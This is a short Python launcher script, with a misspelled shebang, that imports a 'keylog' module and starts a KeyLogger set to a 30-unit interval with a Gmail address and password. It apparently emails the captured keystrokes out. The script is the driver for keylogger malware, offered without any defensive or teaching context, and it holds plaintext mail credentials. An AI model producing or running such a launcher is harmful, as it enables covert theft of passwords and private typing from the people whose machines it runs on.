#!/usr/bin/env pyton
import keylog

my_key_logger = keylog.KeyLogger(30, "abcdefg@gmail.com", "password")
my_key_logger.start()
